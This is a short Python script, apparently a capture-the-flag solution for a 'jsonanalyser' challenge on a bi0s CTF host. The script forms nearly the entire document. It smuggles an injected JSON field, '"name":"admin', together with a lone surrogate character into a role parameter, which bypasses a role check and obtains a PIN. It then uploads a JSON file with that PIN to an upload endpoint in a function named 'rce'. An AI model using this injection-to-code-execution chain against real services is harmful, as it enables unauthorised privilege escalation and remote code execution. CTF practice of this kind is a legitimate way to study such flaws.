import requests

instance_url = "http://jsonanalyser.challenge.bi0s.in:59385/"

def Subscription():
    r=requests.get(f'http://jsonanalyser.challenge.bi0s.in:5000/verify_roles?role=supersuperuseruser\\ud800","name":"admin')
    sub=r.text
    print(sub)
    return sub

def rce(pin):
    files = {'uploadFile': open('file.json','rb')}
    values={'pin':pin}
    url=instance_url+'upload'
    r = requests.post(url, files=files, data=values)
    print(r.text)

pin=Subscription()
rce(pin)
